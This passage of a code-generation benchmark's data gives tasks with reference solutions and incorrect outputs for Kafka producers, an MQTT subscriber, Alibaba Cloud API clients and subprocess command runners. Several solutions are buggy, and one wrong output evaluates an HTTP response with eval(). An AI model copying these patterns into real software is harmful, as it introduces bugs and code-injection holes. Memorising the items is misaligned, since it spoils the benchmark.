    "wrong_result": "```python\nfrom confluent_kafka import Producer\nimport csv\nimport time\nimport json\n\ndef delivery_report(err, msg):\n    if err:\n        print(f'Message delivery failed: {err}')\n    else:\n        print(f'Message delivered to {msg.topic()} [{msg.partition()}]')\n\ndef send_csv_to_kafka():\n    conf = {\n        'bootstrap.servers': 'localhost:9092',\n        'client.id': 'csv-producer'\n    }\n\n    producer = Producer(conf)\n    topic = 'movie-ratings'\n\n    try:\n        with open('movies.csv', newline='', encoding='utf-8') as csvfile:\n            reader = csv.DictReader(csvfile)\n\n            # Send start commit marker\n            producer.produce(topic, key='*COMMIT*', value='START', callback=delivery_report)\n            producer.poll(1)\n            time.sleep(1)\n\n            # Send each CSV row as JSON\n            for row in reader:\n                json_row = json.dumps(row)\n                producer.produce(topic, key=row['movie_id'], value=json_row, callback=delivery_report)\n                producer.poll(1)\n                time.sleep(0.1)  # Small delay to avoid overwhelming the broker\n\n            # Send end commit marker\n            producer.produce(topic, key='*COMMIT*', value='END', callback=delivery_report)\n            producer.poll(1)\n            time.sleep(1)\n\n        producer.flush()\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        producer.close()\n\nsend_csv_to_kafka()\n```"
  },
  {
    "Task_id": 263,
    "Instruction": "Task Description: Write a Python function that tests end-to-end message production to a Kafka topic with configurable compression, verifying successful message delivery.\n\nFunction Description: This function creates a Kafka producer, sends a batch of test messages to a specified topic with the given compression type, verifies all messages were successfully delivered, and properly cleans up resources. It includes version compatibility checks for specific compression types (LZ4 and Zstd).\n\nInput:\n- kafka_broker: [object] - An object containing host and port information for the Kafka broker (must have .host and .port attributes)\n- compression: [str] - The compression type to use for message production (e.g., 'none', 'gzip', 'snappy', 'lz4', 'zstd')\n\nOutput:\n- None (asserts message count matches expected value, raises exceptions on failure)\n\nNote: The function uses pytest.skip() for unsupported compression/version combinations and asserts the successful delivery of all messages.",
    "Canonical_solution": "import pytest\nfrom kafka import KafkaProducer\nfrom test.testutil import env_kafka_version, random_string\n\ndef test_end_to_end(kafka_broker, compression):\n    if compression == 'lz4':\n        if env_kafka_version() < (0, 8, 2):\n            pytest.skip('LZ4 requires 0.8.2')\n        elif platform.python_implementation() == 'PyPy':\n            pytest.skip('python-lz4 crashes on older versions of pypy')\n\n    if compression == 'zstd' and env_kafka_version() < (2, 1, 0):\n        pytest.skip('zstd requires kafka 2.1.0 or newer')\n\n    connect_str = ':'.join([kafka_broker.host, str(kafka_broker.port)])\n    producer = KafkaProducer(bootstrap_servers=connect_str,\n                             retries=5,\n                             max_block_ms=30000,\n                             compression_type=compression,\n                             value_serializer=str.encode)\n\n    topic = random_string(5)\n\n    messages = 100\n    futures = []\n    for i in range(messages):\n        futures.append(producer.send(topic, 'msg %d' % i))\n    ret = [f.get(timeout=30) for f in futures]\n    assert len(ret) == messages\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nfrom confluent_kafka import Producer\nimport pytest\n\ndef test_kafka_producer_message_delivery(kafka_broker, compression):\n    from packaging import version\n\n    conf = {\n        'bootstrap.servers': f\"{kafka_broker.host}:{kafka_broker.port}\",\n        'compression.type': compression,\n        'message.timeout.ms': 30000\n    }\n\n    topic = 'test-topic'\n    num_messages = 10\n\n    # Check for Kafka version compatibility with LZ4 and Zstd\n    kafka_version = Producer(conf).get_config()['api.version.request']\n    if compression == 'lz4' and version.parse(kafka_version) < version.parse('0.11.0'):\n        pytest.skip(\"LZ4 compression requires Kafka >= 0.11.0\")\n    if compression == 'zstd' and version.parse(kafka_version) < version.parse('2.1.0'):\n        pytest.skip(\"Zstd compression requires Kafka >= 2.1.0\")\n\n    messages_sent = 0\n\n    def acked(err, msg, expected_count):\n        nonlocal messages_sent\n        if err:\n            raise Exception(f\"Message delivery failed: {err}\")\n        messages_sent += 1\n        if messages_sent == expected_count:\n            assert messages_sent == expected_count, \"Not all messages were delivered\"\n\n    p = Producer(conf)\n\n    for i in range(num_messages):\n        p.produce(topic, key=f\"key_{i}\", value=f\"value_{i}\", callback=lambda err, msg: acked(err, msg, num_messages))\n\n    p.poll(1)\n    p.flush()\n\n    assert messages_sent == num_messages, \"Message count mismatch\"\n```"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Create a Python function that sends messages to a Kafka topic with simulated linear regression data points.\n\nFunction Description: The function `send_kafka_messages` generates a sequence of data points following a linear pattern with slight random noise, then sends these points as JSON-encoded messages to a specified Kafka topic. It handles Kafka producer initialization with secure authentication, message sending with a delay, and proper resource cleanup.\n\nInput: None (The function uses environment variables for Kafka credentials: UPSTASH_KAFKA_USER and UPSTASH_KAFKA_PASS)\n\nOutput: None (The function's effect is sending messages to Kafka, not returning a value)",
    "Canonical_solution": "import json\nimport os\nimport random\nimport time\nfrom kafka import KafkaProducer\n\ndef send_kafka_messages():\n    topic = \"linear-regression\"\n    random.seed(0)\n\n    def get_value(i):\n        return i + (2 * random.random() - 1) / 10\n\n    kafka_endpoint = \"talented-cow-10356-eu1-kafka.upstash.io:9092\"\n    kafka_user = os.environ[\"UPSTASH_KAFKA_USER\"]\n    kafka_pass = os.environ[\"UPSTASH_KAFKA_PASS\"]\n\n    producer = KafkaProducer(\n        bootstrap_servers=[kafka_endpoint],\n        sasl_mechanism=\"SCRAM-SHA-256\",\n        security_protocol=\"SASL_SSL\",\n        sasl_plain_username=kafka_user,\n        sasl_plain_password=kafka_pass,\n        api_version=(0, 10, 2),\n    )\n\n    for i in range(10):\n        time.sleep(1)\n        payload = {\n            \"x\": i,\n            \"y\": get_value(i),\n        }\n        producer.send(topic, json.dumps(payload).encode(\"utf-8\"))\n\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport os\nimport json\nimport time\nimport random\nfrom confluent_kafka import Producer\n\ndef send_kafka_messages():\n    conf = {\n        'bootstrap.servers': 'eu-central-1.upstash.io:9092',\n        'security.protocol': 'SASL_SSL',\n        'sasl.mechanisms': 'SCRAM-SHA-512',\n        'sasl.username': os.getenv('UPSTASH_KAFKA_USER'),\n        'sasl.password': os.getenv('UPSTASH_KAFKA_PASS')\n    }\n\n    topic = 'linear-regression-data'\n\n    producer = Producer(conf)\n\n    def delivery_report(err, msg):\n        if err:\n            print(f'Message delivery failed: {err}')\n        else:\n            print(f'Message delivered to {msg.topic()} [{msg.partition()}]')\n\n    for i in range(100):\n        x = i\n        y = 2 * x + 3 + random.uniform(-1, 1)\n        data_point = {'x': x, 'y': y}\n        message = json.dumps(data_point)\n        producer.produce(topic, key=str(i), value=message, callback=delivery_report)\n        producer.poll(0)\n        time.sleep(0.1)\n\n    producer.flush()\n```"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Implement an MQTT subscriber function in Python that connects to a broker, subscribes to a topic, and processes incoming messages using the Paho MQTT client library.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker over WebSockets, subscribes to a specified topic, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, incoming messages, and subscription acknowledgments.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Implement an MQTT subscriber class in Python that encapsulates the functionality of connecting to a broker, subscribing to topics, and processing incoming messages using the Paho MQTT client library.\n\nClass Description: The `MQTTSubscriber` class provides a reusable and configurable way to subscribe to MQTT topics. It initializes with broker details and topic configurations, and it uses callback methods to handle MQTT events such as connection, message reception, and subscription.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The Paho MQTT client instance used for communication.\n- `broker_address`: [str] - The address of the MQTT broker.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The MQTT topic to subscribe to.\n- `qos`: [int] - The Quality of Service level for the subscription.\n\nMethods:\n\n- `__init__(broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None` - Initializes the MQTT subscriber with broker details and topic configuration.\n- `on_connect(client: mqtt.Client, obj: Any, flags: dict, reason_code: int, properties: Any) -> None` - Callback for when the client connects to the broker.\n- `on_message(client: mqtt.Client, obj: Any, msg: mqtt.MQTTMessage) -> None` - Callback for when a message is received on the subscribed topic.\n- `on_subscribe(client: mqtt.Client, obj: Any, mid: int, reason_code_list: list, properties: Any) -> None` - Callback for when the client subscribes to a topic.\n- `start() -> None` - Connects to the broker, subscribes to the topic, and starts the MQTT loop to process messages.\n- `stop() -> None` - Stops the MQTT loop and disconnects from the broker.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \"+str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic+\" \"+str(msg.qos)+\" \"+str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \"+str(mid)+\" \"+str(reason_code_list))\n\ndef on_log(mqttc, obj, level, string):\n    print(string)\n\ndef mqtt_subscriber():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, transport=\"websockets\")\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 80, 60)\n    mqttc.subscribe(\"$SYS/broker/version\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "```python\nimport paho.mqtt.client as mqtt\nfrom typing import Any\n\nclass MQTTSubscriber:\n    def __init__(self, broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None:\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.qos = qos\n        self.client = mqtt.Client(protocol=mqtt.MQTTv5, transport=\"websockets\")\n\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def on_connect(self, client: mqtt.Client, obj: Any, flags: dict, reason_code: int, properties: Any) -> None:\n        print(f\"Connected with result code {reason_code}\")\n        self.client.subscribe(self.topic, qos=self.qos)\n\n    def on_message(self, client: mqtt.Client, obj: Any, msg: mqtt.MQTTMessage) -> None:\n        print(f\"Received message on topic {msg.topic}: {msg.payload.decode()}\")\n\n    def on_subscribe(self, client: mqtt.Client, obj: Any, mid: int, reason_code_list: list, properties: Any) -> None:\n        print(f\"Subscribed to topic with MID {mid}, Reason codes: {reason_code_list}\")\n\n    def start(self) -> None:\n        self.client.connect(self.broker_address, self.broker_port)\n        self.client.loop_start()\n\n    def stop(self) -> None:\n        self.client.loop_stop()\n        self.client.disconnect()\n```"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Alibaba Cloud DNS API, handling request signing, connection management, and response processing.\n\nClass Description: The API class provides methods to send authenticated requests to Alibaba Cloud's DNS API. It handles parameter signing, HTTP connection management (with optional proxy support), and response processing.\n\nAttributes:\n\nID: [str] - API access key ID stored in Config class\nTOKEN: [str] - API access token stored in Config class\nPROXY: [str/None] - Optional proxy server address stored in Config class\nTTL: [int/None] - Optional time-to-live value stored in Config class\nSITE: [str] - API endpoint domain (constant in API class)\nMETHOD: [str] - Default HTTP method (constant in API class)\n\nMethods:\n\nrequest: [request](param=None, **params) -> [dict] - Main method to send API requests. Takes optional dictionary or keyword parameters, signs them, sends HTTP request, and returns parsed response. Raises exception on error.\nsignature: [signature](params) -> [dict] - Internal method to sign request parameters (implementation not shown in reference code)\n__init__: [__init__]() -> [None] - Constructor for Config class to initialize credentials and settings\ngetresponse: [getresponse]() -> [HTTPResponse] - Internal method to get HTTP response (called through connection object)\nclose: [close]() -> [None] - Internal method to close HTTP connection (called through connection object)",
    "Canonical_solution": "from hashlib import sha1\nfrom hmac import new as hmac\nfrom uuid import uuid4\nfrom base64 import b64encode\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode, quote_plus, quote\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"alidns.aliyuncs.com\"\n    METHOD = \"POST\"\n\ndef request(param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s: %s\", API.SITE, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(API.METHOD, '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    data = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]: %s', params['Action'], response.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', params['Action'], data)\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport urllib.parse\nimport time\n\nclass Config:\n    def __init__(self):\n        self.ID = \"your_access_key_id\"\n        self.TOKEN = \"your_access_token\"\n        self.PROXY = None\n        self.TTL = 300\n\nclass API:\n    SITE = \"alidns.aliyuncs.com\"\n    METHOD = \"GET\"\n\n    def __init__(self, config=None):\n        if not config:\n            config = Config()\n        self.config = config\n        self.connection = self._create_connection()\n\n    def _create_connection(self):\n        if self.config.PROXY:\n            proxy_host, _, proxy_port = self.config.PROXY.partition(':')\n            port = int(proxy_port) if proxy_port.isdigit() else 8080\n            return http.client.HTTPConnection(proxy_host, port)\n        else:\n            return http.client.HTTPConnection(API.SITE)\n\n    def request(self, param=None, **params):\n        params.update(param or {})\n        params[\"Timestamp\"] = time.strftime(\"%Y-%m-%dT%H:%M:%SZ\", time.gmtime())\n        params[\"Format\"] = \"JSON\"\n        params[\"Version\"] = \"2015-01-09\"\n        params[\"AccessKeyId\"] = self.config.ID\n        params[\"SignatureMethod\"] = \"HMAC-SHA1\"\n        params[\"SignatureVersion\"] = \"1.0\"\n        params[\"Signature\"] = self.signature(params)\n\n        path = f\"/?{urllib.parse.urlencode(params)}\"\n        self.connection.request(API.METHOD, path)\n        response = self.getresponse()\n        data = response.read().decode(\"utf-8\")\n        self.close()\n        return eval(data)\n\n    def signature(self, params):\n        # Signature logic implementation goes here\n        pass\n\n    def getresponse(self):\n        return self.connection.getresponse()\n\n    def close(self):\n        self.connection.close()\n```"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a function to execute system commands using subprocess with pipe-based inter-process communication in Python.\n\nFunction Description: The function should run a system command in a new process, capture its output and error streams, and optionally return a boolean indicating success/failure instead of the output. It should use subprocess.PIPE for communication between processes.\n\nInput:\n- cmd: [str] - The system command to be executed\n- is_ok: [bool] (optional, default=False) - Flag to determine return type (True/False for success/failure if True, output/error if False)\n\nOutput:\n- If is_ok=True: [bool] - Returns True if command executed successfully (returncode=0), False otherwise\n- If is_ok=False: [tuple] - Returns a tuple containing (output, error) as bytes objects from stdout and stderr respectively",
    "Canonical_solution": "import subprocess\n\ndef run_cmd(cmd, is_ok=False):\n    \"\"\"\n    Run cmd\n    \"\"\"\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,\n                         shell=True, executable='/bin/bash')\n\n    output, err = p.communicate()\n    if is_ok:\n        if p.returncode == 0:\n            return True\n        else:\n            return False\n\n    return output, err",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef execute_command(cmd, is_ok=False):\n    process = subprocess.Popen(\n        cmd,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        shell=True,\n        text=False\n    )\n    output, error = process.communicate()\n    if is_ok:\n        return process.returncode == 0\n    return (output, error)\n```"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Implement a class that interacts with Alibaba Cloud's Flash Recognizer service to convert audio files into text with timing information using HTTP client functionality.\n\nClass Description: AliRecognitionService is a client for Alibaba Cloud's speech recognition API that processes audio files and returns recognition results with timestamps.\n\nAttributes:\nALI_ACCESS_AKID: str - Alibaba Cloud access key ID for authentication\nALI_ACCESS_AKKEY: str - Alibaba Cloud access key secret for authentication\nALI_APP_KEY: str - Application key for the recognition service\ntoken: str - Authentication token obtained using access credentials\nformat: str - Audio file format (default: \"wav\")\nsampleRate: int - Audio sample rate in Hz (default: 16000)\nurl: str - API endpoint URL for the recognition service\n\nMethods:\n__init__(access_key_id: str, access_key_secret: str, app_key: str) -> None - Initializes the recognition service with authentication credentials and application key\nprocess(audioFile: str) -> List[AliRecognitionResult] - Processes an audio file and returns a list of recognition results containing text with begin/end timestamps\n\nHelper Class:\nAliRecognitionResult: A data class to store recognition results with text and timing information\n__init__(text: str, begin_time: int, end_time: int) -> None - Initializes a recognition result with text and its timing information",
    "Canonical_solution": "import http.client\nimport json\nfrom typing import List\n\nclass AliRecognitionResult:\n    def __init__(self, text, begin_time, end_time):\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n\nclass AliRecognitionService:\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str):\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = getToken(self.ALI_ACCESS_AKID, self.ALI_ACCESS_AKKEY)\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = 'https://nls-gateway-cn-shanghai.aliyuncs.com/stream/v1/FlashRecognizer'\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        result_list = []\n        request = self.url + '?appkey=' + self.ALI_APP_KEY\n        request = request + '&token=' + self.token\n        request = request + '&format=' + self.format\n        request = request + '&sample_rate=' + str(self.sampleRate)\n\n        with open(audioFile, mode='rb') as f:\n            audioContent = f.read()\n        \n        host = 'nls-gateway-cn-shanghai.aliyuncs.com'\n        httpHeaders = {'Content-Length': len(audioContent)}\n        \n        conn = http.client.HTTPSConnection(host)\n        conn.request(method='POST', url=request, body=audioContent, headers=httpHeaders)\n        response = conn.getresponse()\n        \n        body = response.read()\n        try:\n            body = json.loads(body)\n            status = body['status']\n            if status == 20000000:\n                result = body['flash_result']\n                if 'sentences' in result:\n                    for sentence in result['sentences']:\n                        result_list.append(\n                            AliRecognitionResult(sentence['text'], sentence['begin_time'], sentence['end_time']))\n        except ValueError:\n            print('The response is not json format string')\n        finally:\n            conn.close()\n        return result_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nimport json\nfrom typing import List\n\nclass AliRecognitionResult:\n    def __init__(self, text: str, begin_time: int, end_time: int) -> None:\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n\n\nclass AliRecognitionService:\n    ALI_ACCESS_AKID: str\n    ALI_ACCESS_AKKEY: str\n    ALI_APP_KEY: str\n    token: str\n    format: str = \"wav\"\n    sampleRate: int = 16000\n    url: str = \"https://api.aliyun.com/recognize\"\n\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str) -> None:\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = self._get_token()\n\n    def _get_token(self) -> str:\n        auth_url = \"https://auth.aliyun.com/token\"\n        payload = {\n            \"accessKeyId\": self.ALI_ACCESS_AKID,\n            \"accessKeySecret\": self.ALI_ACCESS_AKKEY\n        }\n        response = requests.post(auth_url, data=payload)\n        return response.json()[\"token\"]\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        with open(audioFile, \"rb\") as f:\n            audio_data = f.read()\n\n        headers = {\n            \"Authorization\": f\"Bearer {self.token}\",\n            \"App-Key\": self.ALI_APP_KEY,\n            \"Content-Type\": f\"audio/{self.format};rate={self.sampleRate}\"\n        }\n\n        files = {\"file\": (audioFile, audio_data)}\n        response = requests.post(self.url, headers=headers, files=files)\n\n        results = []\n        if response.status_code == 200:\n            result_data = response.json()\n            for item in result_data.get(\"results\", []):\n                results.append(\n                    AliRecognitionResult(\n                        text=item[\"text\"],\n                        begin_time=int(item[\"begin\"]),\n                        end_time=int(item[\"end\"])\n                    )\n                )\n        return results\n```"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a function to execute system commands and handle input/output communication between processes using pipes.\n\nFunction Description: The function `runCmd` executes a system command in a subprocess and facilitates communication via pipes. It can handle both cases where input data is provided to the subprocess and where no input is required. The function captures the standard output, standard error, and return code of the executed command.\n\nInput:\n- `cmd`: [List or String] - The command to be executed, either as a list of arguments or a single string.\n- `data`: [Bytes, optional] - Input data to be sent to the subprocess's standard input. Defaults to None if no input is required.\n\nOutput:\n- A tuple containing:\n  - `stdout`: [String] - The decoded standard output of the command.\n  - `stderr`: [String] - The decoded standard error of the command.\n  - `returncode`: [Integer] - The return code of the executed command.",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef runCmd(cmd, data=None):\n    if input is None:\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n    else:\n        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate(input=data)\n\n    return stdout.decode('utf-8'), stderr.decode('utf-8'), p.returncode",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef runCmd(cmd, data=None):\n    process = subprocess.Popen(\n        cmd,\n        stdin=subprocess.PIPE if data else subprocess.DEVNULL,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=False\n    )\n    stdout, stderr = process.communicate(input=data)\n    return stdout.decode(), stderr.decode(), process.returncode\n```"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that runs a Python subprocess with pipe communication, compares the output with expected results from a JSON file, and asserts their equality.\n\nFunction Description: The function `run_subprocess_with_pipe` executes a Python subprocess with given arguments, captures its output through a pipe, and compares this output with expected results loaded from a JSON file. The comparison includes checking the length of the results and verifying that all elements match between the expected and actual outputs.\n\nInput:\n- `expected_file`: [str] - Path to the JSON file containing the expected output data.\n- `*args`: [variable arguments] - Additional command-line arguments to pass to the subprocess.\n\nOutput: None (The function performs assertions to validate the output against the expected results. If assertions fail, an AssertionError is raised.)",
    "Canonical_solution": "import sys\nimport subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    dg = subprocess.Popen([sys.executable] + list(args), stdout=subprocess.PIPE)\n    stdout, _ = dg.communicate()\n    expected = json.load(open(expected_file))\n    result = json.loads(stdout.decode())\n    \n    assert len(expected) == len(result)\n    assert all(r in result for r in expected)\n    assert all(r in expected for r in result)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    result = subprocess.run(\n        ['python'] + list(args),\n        capture_output=True,\n        text=True\n    )\n    actual_output = json.loads(result.stdout)\n    \n    with open(expected_file, 'r') as f:\n        expected_output = json.load(f)\n\n    assert len(actual_output) == len(expected_output), \"Length of outputs do not match\"\n    assert all(a == b for a, b in zip(actual_output, expected_output)), \"Output elements do not match\"\n```"
  },
  {
    "Task_id": 285,
    "Instruction": "Task Description: Create a function that executes a command-line process (specifically 'exodus') with given arguments and options, handling input/output through pipes, and returning the process's exit code and output streams.\n\nFunction Description: The function `run_exodus` launches an external 'exodus' process with specified arguments and options. It manages inter-process communication using pipes for stdin, stdout, and stderr. The function supports optional stdin input and returns the process's exit code along with captured stdout and stderr outputs.\n\nInput:\n- `args`: [List[str]] - Command-line arguments to pass to the 'exodus' process\n- `**options`: [Dict] - Additional subprocess.Popen options, including:\n  - `stdin`: [str, optional] - Input content to pipe into the process's stdin (encoded as UTF-8)\n  - `universal_newlines`: [bool, optional] - Flag to handle text streams (default: True)\n\nOutput:\n- Tuple containing:\n  - `returncode`: [int] - Exit status of the process\n  - `stdout`: [str] - Captured standard output\n  - `stderr`: [str] - Captured standard error",
    "Canonical_solution": "import os\nimport subprocess\n\ndef run_exodus(args, **options):\n    options['universal_newlines'] = options.get('universal_newlines', True)\n\n    # Allow specifying content to pipe into stdin, with options['stdin']\n    if 'stdin' in options:\n        input = options['stdin'].encode('utf-8')\n        options['stdin'] = subprocess.PIPE\n    else:\n        input = None\n\n    process = subprocess.Popen(\n        ['exodus'] + args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)\n    stdout, stderr = process.communicate(input=input)\n    return process.returncode, stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nfrom typing import List, Dict, Tuple\n\ndef run_exodus(args: List[str], **options: Dict) -> Tuple[int, str, str]:\n    stdin_input = options.pop('stdin', None)\n    universal_newlines = options.pop('universal_newlines', True)\n\n    process = subprocess.Popen(\n        ['exodus'] + args,\n        stdin=subprocess.PIPE if stdin_input else None,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        universal_newlines=universal_newlines,\n        **options\n    )\n\n    stdout, stderr = process.communicate(input=stdin_input.encode() if stdin_input and not universal_newlines else stdin_input)\n    returncode = process.returncode\n\n    return returncode, stdout, stderr\n```"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words into their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model. The class should handle both single words and lists of words, and provide options for retrieving multiple pronunciation candidates.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words to their phonetic pronunciations using a specified FST model. It supports both single-word and batch processing, with optional n-best results.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for G2P conversion.\n- nbest: [int/None] - The number of best pronunciation candidates to return for each word (optional).\n- _logger: [logging.Logger] - Logger instance for debugging and error reporting.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> None - Initializes the G2P converter with the path to the FST model and optional n-best setting.\n- execute(fst_model, input, is_file=False, nbest=None) -> dict - Executes the phonetisaurus-g2p command with the given input and returns the pronunciation results as a dictionary.\n- _translate_word(word) -> dict - Internal method to translate a single word to phonemes.\n- _translate_words(words) -> dict - Internal method to translate a list of words to phonemes using a temporary file.\n- translate(words) -> dict - Main interface method that translates either a single word or a list of words to their phonetic pronunciations.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport tempfile\nimport logging\nimport yaml\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self._logger.debug(\"Using FST model: '%s'\", self.fst_model)\n        self.nbest = nbest\n        if self.nbest is not None:\n            self._logger.debug(\"Will use the %d best results.\", self.nbest)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if nbest is not None:\n            cmd.extend(['--nbest=%d' % nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(suffix='.g2p', delete=False) as f:\n            for word in words:\n                f.write(\"%s\\n\" % word)\n            tmp_fname = f.name\n        output = self.execute(self.fst_model, tmp_fname, is_file=True,\n                              nbest=self.nbest)\n        os.remove(tmp_fname)\n        return output\n\n    def translate(self, words):\n        if type(words) is str or len(words) == 1:\n            self._logger.debug('Converting single word to phonemes')\n            output = self._translate_word(words if type(words) is str\n                                          else words[0])\n        else:\n            self._logger.debug('Converting %d words to phonemes', len(words))\n            output = self._translate_words(words)\n        self._logger.debug('G2P conversion returned phonemes for %d words',\n                           len(output))\n        return output",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
